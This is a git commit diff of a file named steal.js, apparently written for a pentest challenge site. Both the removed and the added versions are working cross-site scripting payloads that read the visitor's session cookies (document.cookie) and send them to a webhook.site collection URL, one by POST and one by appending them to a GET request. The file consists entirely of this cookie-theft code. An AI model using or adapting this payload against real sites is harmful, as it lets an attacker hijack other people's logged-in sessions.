0ccde5574b14ecf4ac29702c61a2069780360181
vhash <29121316+LucasVanHaaren@users.noreply.github.com>
2024-10-23 17:26:09 +0200

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,5 +1,5 @@
-fetch('https://webhook.site/c5f1c6bb-4ba1-4b8b-b906-40c5f5203c77/', {
-  method: "POST",
-  body: document.cookie
-});
-window.location.replace("https://challenge.almond-pentest.fr/?p=&c=");
+const xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://webhook.site/c5f1c6bb-4ba1-4b8b-b906-40c5f5203c77/'+document.cookie);
+xhr.onload = () => console.log(xhr.responseText);
+xhr.send();
+// window.location.replace("https://challenge.almond-pentest.fr/?p=&c=");
